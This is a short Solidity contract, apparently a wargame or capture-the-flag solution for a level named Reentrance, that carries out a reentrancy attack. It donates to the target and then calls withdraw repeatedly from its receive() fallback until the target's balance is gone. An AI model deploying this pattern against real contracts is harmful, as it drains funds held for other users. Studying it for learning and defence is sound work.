// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Solution {

  Reentrance instance;

  constructor(Reentrance _instance) {
    instance = _instance;
  }

  function solve() external payable {
    // donate first
    instance.donate{value: msg.value}(address(this));

    // then try to withdraw
    instance.withdraw(msg.value);
  }

  receive() external payable {
    if(address(instance).balance != 0)
      instance.withdraw(msg.value);
  }
}
